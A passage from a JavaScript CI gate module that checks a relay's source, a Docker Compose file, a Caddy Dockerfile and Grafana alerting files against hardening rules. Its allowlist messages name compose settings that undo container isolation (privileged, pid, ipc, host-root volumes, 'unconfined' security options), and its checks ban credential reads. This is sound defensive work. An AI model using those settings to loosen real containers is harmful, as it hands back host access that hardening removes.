            'independent cadence nobody reviewed — and the relaxation exists for the poll loop ' +
            'alone. The daemon takes its timer through an INJECTED seam, so the tests need none ' +
            'of these at all.',
        );
      }
    }
    classified.push(`${file.name}:${tier.id}`);
  }
  if (problems.length > 0) return fail(problems.join(' || '));
  return pass(
    `G9j: ${files.length} relay .mjs file(s), each in exactly one ban tier ` +
      `(${classified.join(', ')})`,
  );
}

/**
 * G9i's OBS-45 static half for ONE relay PRODUCTION file. Returns the problems
 * it found; an empty array means clean.
 *
 * Extracted from the eval body so the T-p fixtures drive the SAME code path the
 * gate runs, rather than a re-implementation that could drift from it.
 */
export function relayProductionProblems(file, source) {
  const rel = `${RELAY_REL}/${file}`;
  const lines = codeLines(source);
  const problems = [];
  for (const surface of CREDENTIAL_SURFACE) {
    if (lines.some((line) => line.includes(surface))) {
      problems.push(
        `G9i (OBS-45): ${rel} exposes a credential surface (${surface}) — the relay reads the ` +
          'same read-only bind mount Alloy does and must neither require nor accept a ' +
          'module-owner credential',
      );
    }
  }
  for (const word of CREDENTIAL_WORDS) {
    if (lines.some((line) => containsCredentialWord(line, word))) {
      problems.push(
        `G9i (OBS-45): ${rel} reads a \`${word}\`-shaped value — OBS-45 forbids the relay ` +
          'REQUIRING or ACCEPTING a module-owner credential, and an env read is acceptance',
      );
    }
  }
  for (const api of WRITE_APIS) {
    if (lines.some((line) => line.includes(api))) {
      problems.push(
        `G9i (OBS-45): ${rel} calls a write API (${api}). Every relay file is read-only: both ` +
          'shells emit their document on STDOUT, so a write call has no legitimate caller here — ' +
          'and D2 forbids an offset checkpoint file specifically, which is the one a tail-follow ' +
          'daemon is most tempted to write.',
      );
    }
  }
  for (const literal of NETWORK_LITERAL_BANS) {
    if (lines.some((line) => line.includes(literal))) {
      problems.push(
        `G9i (AM16(a)): ${rel} spells \`${literal}\` in code. \`0.0.0.0\` would make OBS-17's ` +
          'loopback rule a statement about the compose file only; a `://` scheme literal is what ' +
          'the remote-only Semgrep raw-URL rule matches, and local `just ci` cannot catch it — ' +
          'the fix after a push costs a squash onto a fresh branch, because force-push is ' +
          'hook-blocked. Assemble it from fragments or take it from a flag.',
      );
    }
  }
  if (RELAY_PURE_FILES.includes(file) && lines.some((line) => line.includes('node:fs'))) {
    problems.push(
      `G9i: ${rel} imports node:fs — the pure core takes text in and returns data out; all I/O ` +
        'belongs to an imperative shell',
    );
  }
  if (
    RELAY_SHELL_FILES.includes(file) &&
    !lines.some((line) => RELAY_READ_APIS.some((api) => line.includes(api)))
  ) {
    problems.push(
      `G9i: ${rel} never reads the logs directory (none of [${RELAY_READ_APIS.join(', ')}]) — a ` +
        'shell that reads nothing cannot be confirmed to read it READ-ONLY',
    );
  }
  return problems;
}

// ===========================================================================
// 13r-a (ADR-0190) — G12a..G12e, the boot tripwires
//
// SCOPING DOCTRINE, stated once and obeyed by every detector below: a compose
// service block is resolved INSIDE the `services:` mapping, with an
// exactly-one-match requirement. The shipped `composeServiceBlock`
// (checks/stack-config-checks.mjs:98-111) does a whole-file `findIndex` for
// `  <name>:` while `parseComposeServices` scopes to `services:`, so a six-line
// top-level `x-decoy:` key holding a benign service shadows the real one and a
// compose with a public listener and a shell entrypoint passes five merged
// predicates today (live-proven; surfaced as R7, out of touches). The helpers
// below are written here rather than imported for exactly that reason — the
// bug is in the import, so importing it would inherit it.
// ===========================================================================

/** The `services:` mapping body, fail-loud. Never a whole-file search. */
function composeServicesBody(composeText) {
  const lines = stripHashComments(composeText).split('\n');
  const roots = [];
  for (let i = 0; i < lines.length; i++) {
    if (lines[i].startsWith('services:')) roots.push(i);
  }
  if (roots.length !== 1) {
    return fail(`expected exactly one column-0 \`services:\` key, found ${roots.length}`);
  }
  if (lines[roots[0]].slice('services:'.length).trim().length > 0) {
    return fail('`services:` uses inline/flow style, which this scanner cannot read — fail loud');
  }
  return { ok: true, body: subBlock(lines, roots[0]) };
}

/** The lines of ONE compose service block, scoped inside `services:` (AM17). */
export function composeServiceBlockScoped(composeText, serviceName) {
  const services = composeServicesBody(composeText);
  if (!services.ok) return services;
  const idx = keyIndices(services.body, serviceName, 2);
  if (idx.length !== 1) {
    return fail(
      `found ${idx.length} \`${serviceName}:\` keys at two-space indent INSIDE \`services:\`; ` +
        'exactly 1 is required. A whole-file search would also match a top-level `x-decoy:` ' +
        "block's copy of this service name and validate the decoy instead of the real thing.",
    );
  }
  return {
    ok: true,
    detail: `${serviceName} block resolved`,
    lines: subBlock(services.body, idx[0]),
  };
}

/** The keys declared at EXACTLY `indent` in a block. Fail-loud on anything odd. */
function blockTopKeys(blockLines, indent) {
  const keys = [];
  for (let i = 0; i < blockLines.length; i++) {
    const line = blockLines[i];
    if (line.trim().length === 0) continue;
    if (indentOf(line) !== indent) continue;
    const t = line.trim();
    if (t.startsWith('- ')) {
      return fail(`a list item sits where a mapping key was expected: \`${t.slice(0, 48)}\``);
    }
    const colon = t.indexOf(':');
    if (colon <= 0) {
      return fail(`unparsable line where a mapping key was expected: \`${t.slice(0, 48)}\``);
    }
    keys.push({ name: t.slice(0, colon), index: i });
  }
  return { ok: true, keys };
}

/** The `- ` scalar items of the block under `blockLines[keyIndex]`, fail-loud. */
function scalarListUnder(blockLines, keyIndex) {
  const values = [];
  for (const line of subBlock(blockLines, keyIndex)) {
    if (line.trim().length === 0) continue;
    const t = line.trim();
    if (!t.startsWith('- ')) {
      return fail(`\`${t.slice(0, 48)}\` is not a \`- \` list item — fail loud, never skip`);
    }
    values.push(scalarOf(`x: ${t.slice(2).trim()}`, 'x'));
  }
  return { ok: true, values };
}

/** One scalar value from a scoped service block, fail-loud on 0 or >1 keys. */
function scopedServiceScalar(composeText, serviceName, key) {
  const block = composeServiceBlockScoped(composeText, serviceName);
  if (!block.ok) return block;
  const idx = keyIndices(block.lines, key, 4);
  if (idx.length !== 1) {
    return fail(`the \`${serviceName}\` service declares ${idx.length} \`${key}:\` keys, need 1`);
  }
  return { ok: true, value: scalarOf(block.lines[idx[0]], key) };
}

/** `image` starts with `tag`, and the tag is not a PREFIX of a longer one. */
function imageCarriesTag(image, tag) {
  if (!image.startsWith(tag)) return false;
  const next = image[tag.length];
  return next === undefined || next === '@';
}

// ---------------------------------------------------------------------------
// G12a — the tempo park tripwire
// ---------------------------------------------------------------------------

const TEMPO_FLAG_CONFIG = '-config.file=/etc/tempo/tempo-config.yml';
const TEMPO_FLAG_LISTEN = '-server.http-listen-address=127.0.0.1';

/** PARK FORM (ADR-0190 D1). Post-fix form drops the second item — see AM2. */
export const TEMPO_COMMAND_PARKED = [TEMPO_FLAG_CONFIG, TEMPO_FLAG_LISTEN];

/**
 * The TAG, not the digest (reviewer m2): a same-version CVE rebuild moves the
 * digest without changing the flag set, so a digest pin would red for nothing,
 * while a VERSION bump still forces re-verification of the park's premise —
 * which is the actual intent.
 */
export const TEMPO_IMAGE_TAG = 'grafana/tempo:2.10.7';

/** Must name BOTH files a reader has to open. A prescription in a PR body rots. */
const TEMPO_PARK_PRESCRIPTION =
  'FOLLOW-UP PRESCRIPTION (ADR-0190 D1): `checks/stack-config-checks.mjs` — ' +
  'checkListenAddrsLoopback stops being a flat LISTEN_FLAGS scan and gains per-service binding ' +
  'sources, reading http_listen_address / grpc_listen_address from `tempo/tempo-config.yml`; its ' +
  "signature gains that text, so TWO call sites move (this eval's C6 and the checks suite's " +
  'REAL-FILES test); its suite gains three teeth and NODE_TEST_PASS_FLOOR is re-derived; only ' +
  'then does the compose flag go, and this gate converts to its post-fix form.';

const TEMPO_PARK_TRUTH =
  'The committed flag is one grafana/tempo:2.10.7 cannot parse (it has no listen-ADDRESS flag at ' +
  'all), so C6\'s "all 7 services bind 127.0.0.1 only" is VACUOUS FOR TEMPO — tempo\'s real ' +
  'binding lives in tempo/tempo-config.yml, which no gate reads. This tripwire pins a known-false ' +
  'statement in place until the follow-up lands.';

export function checkTempoCommandParked(composeText) {
  const block = composeServiceBlockScoped(composeText, 'tempo');
  if (!block.ok) return fail(`G12a: ${block.detail} — ${TEMPO_PARK_TRUTH}`);

  const cmdIdx = keyIndices(block.lines, 'command', 4);
  if (cmdIdx.length !== 1) {
    return fail(
      `G12a: the tempo service declares ${cmdIdx.length} \`command:\` keys; exactly 1 is ` +
        'required. A missing command is not a passing park — it silently hands tempo its image ' +
        `default. ${TEMPO_PARK_TRUTH}`,
    );
  }
  if (scalarOf(block.lines[cmdIdx[0]], 'command').length > 0) {
    return fail("G12a: tempo's `command:` is inline/flow style, which this scanner cannot read");
  }
  const items = scalarListUnder(block.lines, cmdIdx[0]);
  if (!items.ok) return fail(`G12a: tempo's \`command:\` — ${items.detail}`);
  if (items.values.length === 0) {
    return fail("G12a: tempo's `command:` declares ZERO items — nothing was compared");
  }

  const found = items.values;
  const missing = TEMPO_COMMAND_PARKED.filter((f) => !found.includes(f));
  const extra = found.filter((f) => !TEMPO_COMMAND_PARKED.includes(f));
  if (missing.length > 0) {
    return fail(
      `G12a: tempo's command list is a SUBSET of the parked set — [${missing.join(', ')}] was ` +
        `REMOVED. If that was deliberate, the park has ended and this gate must be converted, ` +
        `not deleted. ${TEMPO_PARK_PRESCRIPTION}`,
    );
  }
  if (extra.length > 0) {
    return fail(
      `G12a: tempo's command list is a SUPERSET of the parked set — [${extra.join(', ')}] is new ` +
        'and possibly a flag this tempo version does not define, which is exactly the defect ' +
        `class the park exists to record. ${TEMPO_PARK_TRUTH}`,
    );
  }
  for (let i = 0; i < TEMPO_COMMAND_PARKED.length; i++) {
    if (found[i] !== TEMPO_COMMAND_PARKED[i]) {
      return fail(
        `G12a: tempo's command items are the right SET in the wrong ORDER (position ${i} is ` +
          `\`${found[i]}\`, expected \`${TEMPO_COMMAND_PARKED[i]}\`) — argv order is not a ` +
          'cosmetic detail, and a set-only comparison would not see this',
      );
    }
  }

  const image = scopedServiceScalar(composeText, 'tempo', 'image');
  if (!image.ok) return fail(`G12a: ${image.detail}`);
  if (!imageCarriesTag(image.value, TEMPO_IMAGE_TAG)) {
    return fail(
      `G12a: tempo runs \`${image.value}\`, whose tag is not the pinned \`${TEMPO_IMAGE_TAG}\`. ` +
        "The park's premise is image-specific: re-run `/tempo -help` against the new version and " +
        `re-verify the flag set before moving this pin. ${TEMPO_PARK_TRUTH}`,
    );
  }

  for (const banned of ['profiles', 'extends']) {
    if (keyIndices(block.lines, banned, 4).length > 0) {
      return fail(
        `G12a: the tempo service declares \`${banned}:\`. \`profiles:\` removes tempo from ` +
          '`docker compose config --services` entirely, so the stack reads six-of-six healthy and ' +
          'the park reads as CLOSED; `extends:` smuggles arbitrary keys in from a file no ' +
          'single-file detector reads. The park is honest only while the failure stays visible ' +
          'in `docker compose ps`.',
      );
    }
  }
  const restart = scopedServiceScalar(composeText, 'tempo', 'restart');
  if (!restart.ok) return fail(`G12a: ${restart.detail}`);
  if (restart.value !== 'unless-stopped') {
    return fail(
      `G12a: tempo declares \`restart: ${restart.value}\`, expected \`unless-stopped\` — the ` +
        'softer version of hiding the park: a service that is not restarting does not look ' +
        'broken in `docker compose ps`',
    );
  }

  return pass(
    `G12a: tempo's park is pinned — command exactly [${found.join(', ')}] in order, image tag ` +
      `${TEMPO_IMAGE_TAG}, no profiles/extends, restart unless-stopped`,
  );
}

// ---------------------------------------------------------------------------
// G12b — alert group intervals, over the WHOLE provisioned alerting directory
// ---------------------------------------------------------------------------

/**
 * Grafana loads EVERY document under provisioning/alerting/, and compose mounts
 * the whole tree: a sibling file with a bad interval reproduces
 * `Failed to provision alerting ... divided exactly by scheduler interval: 10`
 * and exits the container, while a rules.yml-only detector stays green.
 * The expected file set is exact (the G9j anti-smuggling shape) so a new
 * document is a RED, not a silent widening of what this gate covers.
 */
export const ALERTING_DOC_SET = ['contact-points.yml', 'notification-policies.yml', 'rules.yml'];

/**
 * The 10s scheduler tick is a property of the IMAGE (three GF_UNIFIED_ALERTING_*
 * env overrides were tried against 13.1.3 and none moved it), so a version bump
 * must force re-verification of every number below.
 */
export const GRAFANA_IMAGE_TAG = 'grafana/grafana:13.1.3';
const GRAFANA_SCHEDULER_TICK_S = 10;

/** `20s`/`10m`/`1h30m` -> seconds. null for unit-less or unparseable input. */
function parseDurationSeconds(raw) {
  const text = String(raw).trim();
  if (text.length === 0) return null;
  const units = { s: 1, m: 60, h: 3600, d: 86400 };
  let total = 0;
  let digits = '';
  let sawUnit = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i];
    if (c >= '0' && c <= '9') {
      digits += c;
      continue;
    }
    if (!Object.hasOwn(units, c)) return null;
    if (digits.length === 0) return null;
    const n = toInt(digits);
    if (n === null) return null;
    total += n * units[c];
    digits = '';
    sawUnit = true;
  }
  if (digits.length > 0) return null;
  if (!sawUnit) return null;
  return total;
}

export function checkAlertGroupIntervals(docs, grafanaImage) {
  if (!Array.isArray(docs) || docs.length === 0) {
    return fail(
      'G12b: ZERO alerting documents were scanned. Grafana provisions the whole directory; an ' +
        'empty read is not an empty directory, and a scan of nothing passes everything.',
    );
  }
  const names = docs.map((d) => d.name).sort();
  const expected = [...ALERTING_DOC_SET].sort();
  if (names.join(',') !== expected.join(',')) {
    return fail(
      `G12b: the provisioned alerting file set is [${names.join(', ')}], expected ` +
        `[${expected.join(', ')}]. Grafana loads every document in this directory, so a new one ` +
        'is a reviewed change (add it here in the same commit), never a silent widening.',
    );
  }
  if (typeof grafanaImage !== 'string' || grafanaImage.trim().length === 0) {
    return fail(
      'G12b: no grafana image string was resolved from docker-compose.yml — the 10s scheduler ' +
        'tick every number below is derived from is a property of that image',
    );
  }
  if (!imageCarriesTag(grafanaImage, GRAFANA_IMAGE_TAG)) {
    return fail(
      `G12b: grafana runs \`${grafanaImage}\`, whose tag is not the pinned ` +
        `\`${GRAFANA_IMAGE_TAG}\`. The ${GRAFANA_SCHEDULER_TICK_S}s scheduler tick is ` +
        'image-dependent and is not env-overridable: re-verify it against the new version and ' +
        'move this pin in the same change.',
    );
  }

  let totalGroups = 0;
  let totalRules = 0;
  for (const doc of docs) {
    const lines = stripHashComments(doc.text).split('\n');
    const roots = [];
    for (let i = 0; i < lines.length; i++) {
      if (lines[i].startsWith('groups:')) roots.push(i);
    }
    if (roots.length > 1) {
      return fail(`G12b: ${doc.name} declares ${roots.length} column-0 \`groups:\` keys`);
    }
    if (roots.length === 0) continue;
    if (lines[roots[0]].slice('groups:'.length).trim().length > 0) {
      return fail(`G12b: ${doc.name}'s \`groups:\` uses inline/flow style — fail loud`);
    }
    const groups = listItems(subBlock(lines, roots[0]));
    if (groups.length === 0) {
      return fail(
        `G12b: ${doc.name} declares a \`groups:\` key with ZERO groups — an empty provisioning ` +
          'document is not a valid one, and it would make every clause below vacuous',
      );
    }

    for (const group of groups) {
      totalGroups++;
      const childIndent = indentOf(group[0]);
      const nameIdx = keyIndices(group, 'name', childIndent);
      const label = nameIdx.length === 1 ? scalarOf(group[nameIdx[0]], 'name') : '(unnamed group)';
      const where = `${doc.name} group \`${label}\``;

      const ivIdx = keyIndices(group, 'interval', childIndent);
      if (ivIdx.length !== 1) {
        return fail(
          `G12b: ${where} declares ${ivIdx.length} \`interval:\` keys; exactly 1 is required. ` +
            'Zero means Grafana silently applies its own default (which no reader of this file ' +
            'can see); two means YAML picks the last one and the first is a lie.',
        );
      }
      const rawInterval = scalarOf(group[ivIdx[0]], 'interval');
      const interval = parseDurationSeconds(rawInterval);
      if (interval === null) {
        return fail(
          `G12b: ${where} declares \`interval: ${rawInterval}\`, which does not parse as a ` +
            'duration (a unit-less number is NOT seconds here). Fail loud: coercing or skipping ' +
            'an unparseable value is how a config Grafana refuses reads as green.',
        );
      }
      if (interval === 0) {
        return fail(
          `G12b: ${where} declares \`interval: ${rawInterval}\` = 0s. Grafana requires a group ` +
            'interval to be NON-ZERO and divided exactly by its scheduler interval of ' +
            `${GRAFANA_SCHEDULER_TICK_S}s; 0 satisfies the divisibility test and fails the ` +
            'non-zero one, which is why both are checked. Provisioning refuses the file and the ' +
            'grafana container exits.',
        );
      }
      if (interval % GRAFANA_SCHEDULER_TICK_S !== 0) {
        return fail(
          `G12b: ${where} declares \`interval: ${rawInterval}\` = ${interval}s, which is not a ` +
            `multiple of Grafana's ${GRAFANA_SCHEDULER_TICK_S}s scheduler tick. This is ` +
            "GRAFANA's own rule, not a repo convention: provisioning fails with `interval " +
            `(${rawInterval}) should be non-zero and divided exactly by scheduler interval: ` +
            `${GRAFANA_SCHEDULER_TICK_S}` +
            '` and the container exits. The smallest legal value at or above the current one is ' +
            `${(Math.floor(interval / GRAFANA_SCHEDULER_TICK_S) + 1) * GRAFANA_SCHEDULER_TICK_S}s.`,
        );
      }

      const rulesIdx = keyIndices(group, 'rules', childIndent);
      if (rulesIdx.length !== 1) {
        return fail(`G12b: ${where} declares ${rulesIdx.length} \`rules:\` keys, need 1`);
      }
      const rules = listItems(subBlock(group, rulesIdx[0]));
      if (rules.length === 0) {
        return fail(
          `G12b: ${where} declares ZERO rules — a group with no rules means nothing was ` +
            'scanned, and a scan of nothing passes everything',
        );
      }
      for (const rule of rules) {
        totalRules++;
        const ruleIndent = indentOf(rule[0]);
        const titleIdx = keyIndices(rule, 'title', ruleIndent);
        const title = titleIdx.length === 1 ? scalarOf(rule[titleIdx[0]], 'title') : '(untitled)';
        const forIdx = keyIndices(rule, 'for', ruleIndent);
        if (forIdx.length > 1) {
          return fail(`G12b: ${where} rule \`${title}\` declares ${forIdx.length} \`for:\` keys`);
        }
        if (forIdx.length === 0) continue;
        const rawFor = scalarOf(rule[forIdx[0]], 'for');
        const pending = parseDurationSeconds(rawFor);
        if (pending === null) {
          return fail(
            `G12b: ${where} rule \`${title}\` declares \`for: ${rawFor}\`, which does not parse ` +
              'as a duration (a unit-less number is not seconds). Fail loud, never coerce.',
          );
        }
        if (pending % interval !== 0) {
          const effective = Math.ceil(pending / interval) * interval;
          return fail(
            `G12b: ${where} rule \`${title}\` declares \`for: ${rawFor}\` = ${pending}s, which ` +
              `is not an exact multiple of its own group interval (${interval}s). Grafana ` +
              'transitions state only on an evaluation boundary, so this rule actually fires ' +
              `after ceil(${pending}/${interval})*${interval} = ${effective}s and the YAML lies ` +
              'about its own behaviour. NOTE: this is a REPO CONVENTION introduced by ADR-0190, ' +
              'NOT a Grafana restriction — Grafana accepts a non-multiple `for` and rounds it up. ' +
              `Write ${effective}s, or change the interval, and update the annotation prose in ` +
              'the same edit.',
          );
        }
      }
    }
  }

  if (totalGroups === 0) {
    return fail(
      'G12b: ZERO alert-rule groups were found across the provisioned alerting documents — ' +
        'nothing was scanned, which is never green',
    );
  }
  if (totalRules === 0) {
    return fail('G12b: ZERO alert rules were scanned across every group found');
  }
  return pass(
    `G12b: ${docs.length} provisioned alerting document(s), ${totalGroups} group(s), ` +
      `${totalRules} rule(s); every interval non-zero and ${GRAFANA_SCHEDULER_TICK_S}s-divisible, ` +
      'every `for:` an exact multiple of its own group interval',
  );
}

// ---------------------------------------------------------------------------
// G12c — the caddy binary's net-bind capability, stage- and last-writer-aware
// ---------------------------------------------------------------------------

const CADDY_BIN = '/usr/bin/caddy';
const CADDY_WRITERS = ['RUN', 'COPY', 'ADD'];
/** Assembled, never spelled: this file must not trip its own substring ban. */
const NET_BIND_CAP = `cap_net_${'bind'}_service`;

/** Dockerfile logical instructions: comments dropped, continuations joined. */
function dockerInstructions(dockerfileText) {
  const out = [];
  const lines = dockerfileText.split('\n');
  let pending = null;
  for (let i = 0; i < lines.length; i++) {
    const t = lines[i].trim();
    if (pending === null) {
      if (t.length === 0 || t.startsWith('#')) continue;
      pending = { line: i + 1, text: t };
    } else {
      if (t.startsWith('#')) continue;
      pending = { line: pending.line, text: `${pending.text} ${t}` };
    }
    if (pending.text.endsWith('\\')) {
      pending = { line: pending.line, text: pending.text.slice(0, -1).trim() };
      continue;
    }
    out.push(pending);
    pending = null;
  }
  if (pending !== null) return null;
  return out;
}

function verbOf(instruction) {
  const at = instruction.text.indexOf(' ');
  return (at === -1 ? instruction.text : instruction.text.slice(0, at)).toUpperCase();
}

export function checkCaddySetcapBeforeUser(dockerfileText) {
  if (dockerfileText.includes(NET_BIND_CAP)) {
    return fail(
      `G12c: the substring \`${NET_BIND_CAP}\` appears in the Dockerfile. Re-adding the ` +
        'capability re-creates the exact boot failure this gate exists to end: under ' +
        '`--cap-drop ALL` a file capability the process cannot hold makes the kernel refuse the ' +
        'exec outright (`operation not permitted`, exit 255) — a crash-loop, not a degraded mode. ' +
        'The ban covers comments too; name it in prose as "the net-bind file capability".',
    );
  }
  const instructions = dockerInstructions(dockerfileText);
  if (instructions === null) {
    return fail('G12c: the last Dockerfile instruction ends in a line continuation — fail loud');
  }
  if (instructions.length === 0) {
    return fail('G12c: the Dockerfile declares zero instructions — nothing was scanned');
  }
  for (const ins of instructions) {
    if (verbOf(ins) === 'ONBUILD') {
      return fail(
        `G12c: an \`ONBUILD\` instruction at line ${ins.line} — it runs in a CHILD build this ` +
          'gate cannot see, so the final image it produces is not the image analysed here',
      );
    }
  }

  const fromAt = [];
  for (let i = 0; i < instructions.length; i++) {
    if (verbOf(instructions[i]) === 'FROM') fromAt.push(i);
  }
  if (fromAt.length === 0) {
    return fail('G12c: no `FROM` instruction — the stage structure cannot be read, fail loud');
  }
  for (let i = 0; i < fromAt[0]; i++) {
    if (verbOf(instructions[i]) !== 'ARG') {
      return fail(
        `G12c: instruction \`${instructions[i].text.slice(0, 40)}\` (line ${instructions[i].line}) ` +
          'sits before the first `FROM`, so the stage structure is ambiguous — fail loud rather ' +
          'than guess which stage ships',
      );
    }
  }
  const finalFrom = fromAt[fromAt.length - 1];
  const finalStage = instructions.slice(finalFrom + 1);
  if (finalStage.length === 0) {
    return fail('G12c: the final stage declares no instructions at all');
  }

  const isSetcap = (ins) =>
    verbOf(ins) === 'RUN' && ins.text.includes('setcap -r') && ins.text.includes(CADDY_BIN);
  const setcaps = finalStage.filter(isSetcap);
  if (setcaps.length === 0) {
    const earlier = instructions.slice(0, finalFrom).some(isSetcap);
    return fail(
      `G12c: no \`RUN\` instruction in the FINAL stage runs \`setcap -r ${CADDY_BIN}\`` +
        (earlier
          ? ' — one runs in an EARLIER stage, whose filesystem the final image discards. A ' +
            'capability stripped in a builder stage is not stripped in the image that ships ' +
            '(built and measured: the shipped binary still carries the capability and still ' +
            'refuses to exec under --cap-drop ALL).'
          : '. Stock caddy ships that capability on the binary, so a non-root, cap-dropped ' +
            'container cannot exec it at all (exit 255).') +
        ' A `setcap` inside a `#` comment is not an instruction.',
    );
  }
  const writers = finalStage.filter(
    (ins) => CADDY_WRITERS.includes(verbOf(ins)) && ins.text.includes(CADDY_BIN),
  );
  const lastWriter = writers[writers.length - 1];
  if (!isSetcap(lastWriter)) {
    return fail(
      `G12c: \`${verbOf(lastWriter)}\` at line ${lastWriter.line} writes ${CADDY_BIN} AFTER the ` +
        'setcap, so the stripped binary is overwritten by one that still carries the capability. ' +
        'buildkit PRESERVES file capabilities across `COPY --from=`, which is exactly how the ' +
        'capability arrives in this image in the first place — index order against `USER` is not ' +
        'enough; the setcap must be the LAST writer of that path in the final stage.',
    );
  }
  const users = finalStage.filter((ins) => verbOf(ins) === 'USER');
  if (users.length !== 1) {
    return fail(
      `G12c: the final stage declares ${users.length} \`USER\` instruction(s); exactly 1 is ` +
        'required. Zero means the container runs as root and the whole posture is theatre; two ' +
        'means a trailing `USER root` can undo everything the first one bought.',
    );
  }
  if (users[0].line < lastWriter.line) {
    return fail(
      `G12c: \`USER\` (line ${users[0].line}) comes BEFORE the setcap (line ${lastWriter.line}). ` +
        'A non-root user cannot setcap, so this Dockerfile does not build — and if it did, the ' +
        'capability would still be on the binary at runtime.',
    );
  }
  return pass(
    `G12c: the final stage strips the caddy net-bind capability at line ${lastWriter.line}, as ` +
      `the last writer of ${CADDY_BIN}, before its single \`USER\` at line ${users[0].line}`,
  );
}

// ---------------------------------------------------------------------------
// G12d — the alloy service block, as a KEY ALLOWLIST
// ---------------------------------------------------------------------------

/**
 * EXACT SET EQUALITY, BOTH DIRECTIONS — the G12a doctrine applied to keys. A
 * four-property checklist ("user, cap_drop, security_opt, no cap_add") is not a
 * control: `privileged: true` alone passes all four and hands the container the
 * full bounding set (measured: CapBnd 000001ffffffffff vs 0000000000000000) plus
 * 185 host /dev entries (vs 15). `group_add`, `pid`, `ipc`, a `/:/host` volume
 * and an extra security_opt item are each equally uncovered by a checklist.
 * Derived from the committed block plus the `user:` this slice adds.
 */
export const ALLOY_ALLOWED_KEYS = [
  'cap_drop',
  'command',
  'cpus',
  'image',
  'mem_limit',
  'network_mode',
  'restart',
  'security_opt',
  'user',
  'volumes',
];

const ALLOY_SECURITY_OPT = 'no-new-privileges:true';

export function checkAlloyRunsUnprivileged(composeText) {
  const block = composeServiceBlockScoped(composeText, 'alloy');
  if (!block.ok) return fail(`G12d: ${block.detail}`);
  const keys = blockTopKeys(block.lines, 4);
  if (!keys.ok) return fail(`G12d: the alloy block — ${keys.detail}`);
  if (keys.keys.length === 0) {
    return fail('G12d: the alloy service block declares zero keys — nothing was scanned');
  }

  const declared = keys.keys.map((k) => k.name);
  const unexpected = declared.filter((n) => !ALLOY_ALLOWED_KEYS.includes(n));
  if (unexpected.length > 0) {
    return fail(
      `G12d: the alloy service declares [${unexpected.join(', ')}], which is outside the ` +
        `allowlist [${ALLOY_ALLOWED_KEYS.join(', ')}]. This is an allowlist and not a checklist ` +
        'because every one of `privileged`, `group_add`, `pid`, `ipc`, `userns_mode`, `devices`, ' +
        '`extends`, `entrypoint` and a host-root `volumes` entry hands back what the non-root + ' +
        'cap_drop posture just took away while every property check stays green (measured). If ' +
        'a new key is genuinely needed, add it here in the same reviewed change.',
    );
  }
  const dupes = declared.filter((n, i) => declared.indexOf(n) !== i);
  if (dupes.length > 0) {
    return fail(`G12d: the alloy service declares duplicate key(s) [${dupes.join(', ')}]`);
  }

  const userIdx = keyIndices(block.lines, 'user', 4);
  if (userIdx.length !== 1) {
    return fail(
      `G12d: the alloy service declares ${userIdx.length} \`user:\` keys; exactly 1 is required. ` +
        'The image runs uid 0 by default and its own state dirs are mode 0770 owned by 473:473, ' +
        'so root WITHOUT CAP_DAC_OVERRIDE (which `cap_drop: ALL` removes) cannot create them: ' +
        '`mkdir: cannot create directory: Permission denied`, then a crash-loop. A `user:` on ' +
        'any OTHER service does not satisfy this — the check is block-scoped for that reason.',
    );
  }
  const user = scalarOf(block.lines[userIdx[0]], 'user');
  const parts = user.split(':');
  if (parts.length !== 2) {
    return fail(
      `G12d: alloy's \`user: ${user}\` is not <uid>:<gid>. Numeric on purpose: compose passes a ` +
        'NAME through to be resolved in-container against /etc/passwd, which an image rebuild can ' +
        'renumber silently.',
    );
  }
  const uid = toInt(parts[0]);
  const gid = toInt(parts[1]);
  if (uid === null || gid === null) {
    return fail(`G12d: alloy's \`user: ${user}\` is not numeric on both sides`);
  }
  if (uid === 0) {
    return fail(
      `G12d: alloy declares \`user: ${user}\` — uid 0 IS root, which is the state this gate ` +
        'exists to prevent; the quoted form only makes it look deliberate',
    );
  }

  if (keyIndices(block.lines, 'cap_add', 4).length > 0) {
    return fail(
      'G12d: the alloy service declares `cap_add:`. Granting a capability back (DAC_OVERRIDE was ' +
        'the tempting one here) is the rejected alternative to running as the uid that already ' +
        'owns the directories.',
    );
  }
  const dropIdx = keyIndices(block.lines, 'cap_drop', 4);
  if (dropIdx.length !== 1) {
    return fail(`G12d: the alloy service declares ${dropIdx.length} \`cap_drop:\` keys, need 1`);
  }
  const drops = scalarListUnder(block.lines, dropIdx[0]);
  if (!drops.ok) return fail(`G12d: alloy's \`cap_drop:\` — ${drops.detail}`);
  if (!drops.values.includes('ALL')) {
    return fail(
      `G12d: alloy's \`cap_drop:\` is [${drops.values.join(', ') || 'empty'}] and does not ` +
        'contain `ALL` — a partial drop leaves the default bounding set almost intact',
    );
  }

  const optIdx = keyIndices(block.lines, 'security_opt', 4);
  if (optIdx.length !== 1) {
    return fail(`G12d: the alloy service declares ${optIdx.length} \`security_opt:\` keys, need 1`);
  }
  const opts = scalarListUnder(block.lines, optIdx[0]);
  if (!opts.ok) return fail(`G12d: alloy's \`security_opt:\` — ${opts.detail}`);
  if (opts.values.length !== 1 || opts.values[0] !== ALLOY_SECURITY_OPT) {
    return fail(
      `G12d: alloy's \`security_opt:\` is [${opts.values.join(', ') || 'empty'}], expected ` +
        `exactly [${ALLOY_SECURITY_OPT}]. An EXTRA item is the hole: a seccomp or apparmor ` +
        '`unconfined` entry rides along beside the correct one and every "contains" check stays ' +
        'green.',
    );
  }

  return pass(
    `G12d: alloy runs as ${user} with cap_drop [${drops.values.join(', ')}], security_opt ` +
      `[${opts.values.join(', ')}], no cap_add, and only allowlisted keys ` +
      `[${declared.sort().join(', ')}]`,
  );
}

// ---------------------------------------------------------------------------
// G12e — the S4 label-value bounds, PATH-SCOPED into s4_keep
// ---------------------------------------------------------------------------

const S4_KEEP_HEADER = 'otelcol.processor.transform "s4_keep"';

/** Pinned character-for-character. These are DATA, not compiled patterns. */
export const S4_STATEMENT_KEEP_KEYS =
  'keep_matching_keys(attributes, "^(zone_id|build_sha|device_class)$")';
export const S4_STATEMENT_ZONE_ID =
  'delete_key(attributes, "zone_id") where not IsMatch(attributes["zone_id"], "^[0-9]{1,4}$")';
export const S4_STATEMENT_BUILD_SHA =
  'delete_key(attributes, "build_sha") where not IsMatch(attributes["build_sha"], ' +
  '"^[0-9a-f]{7,40}$")';
export const S4_STATEMENT_DEVICE_CLASS =
  'delete_key(attributes, "device_class") where not IsMatch(attributes["device_class"], ' +
  '"^(desktop|mobile|tablet)$")';

const BUILD_SHA_GRAMMAR_NOTE =
  'The `{7,40}` bound is pinned character-for-character: a WIDENING re-opens the label-value ' +
